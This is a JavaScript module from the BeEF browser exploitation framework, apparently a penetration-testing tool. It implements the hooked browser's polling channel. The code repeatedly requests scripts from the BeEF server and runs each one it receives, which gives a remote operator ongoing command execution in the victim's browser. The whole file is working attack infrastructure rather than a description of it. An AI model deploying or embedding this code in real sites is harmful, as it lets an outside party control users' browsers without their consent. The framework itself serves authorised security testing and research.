//
// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - https://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/**
 * Object in charge of getting new commands from the BeEF framework and execute them.
 * The XHR-polling channel is managed here. If WebSockets are enabled,
 * websocket.js is used instead.
 * @namespace beef.updater
 */
beef.updater = {
	
	/** XHR-polling timeout. */ 
	xhr_poll_timeout: "<%= @xhr_poll_timeout %>",
	
	/** Hook session name. */ 
    beefhook: "<%= @hook_session_name %>",
	
	/** A lock. */ 
	lock: false,
	
	/** An object containing all values to be registered and sent by the updater. */
	objects: new Object(),
	
	/**
	 * Registers an object to always send when requesting new commands to the framework.
	 * @param {String} key the name of the object.
	 * @param {String} value the value of that object.
	 * 
	 * @example beef.updater.regObject('java_enabled', 'true');
	 */
	regObject: function(key, value) {
		this.objects[key] = escape(value);
	},
	
	// Checks for new commands from the framework and runs them.
	check: function() {
		if(this.lock == false) {
			if (beef.logger.running) {
				beef.logger.queue();
			}
			beef.net.flush();
			if(beef.commands.length > 0) {
				this.execute_commands();
			}else {
				this.get_commands();    /*Polling*/
			}
		}
        /* The following gives a stupid syntax error in IE, which can be ignored*/
        setTimeout(function(){beef.updater.check()}, beef.updater.xhr_poll_timeout);
	},
	
    /**
     * Gets new commands from the framework.
     */
	get_commands: function() {
		try {
			this.lock = true;
            beef.net.request(beef.net.httpproto, 'GET', beef.net.host, beef.net.port, beef.net.hook, null, beef.updater.beefhook+'='+beef.session.get_hook_session_id(), 5, 'script', function(response) {
                if (response.body != null && response.body.length > 0)
                    beef.updater.execute_commands();
            });
		} catch(e) {
			this.lock = false;
			return;
		}
		this.lock = false;
	},
	
    /**
     * Executes the received commands, if any.
     */
	execute_commands: function() {
		if(beef.commands.length == 0) return;
		this.lock = true;
		while(beef.commands.length > 0) {
			command = beef.commands.pop();
			try {
				command();
			} catch(e) {
				beef.debug('execute_commands - command failed to execute: ' + e.message);
                // prints the command source to be executed, to better trace errors
                // beef.client_debug must be enabled in the main config
                beef.debug(command.toString());
			}
		}
		this.lock = false;
	}
};

beef.regCmp('beef.updater');
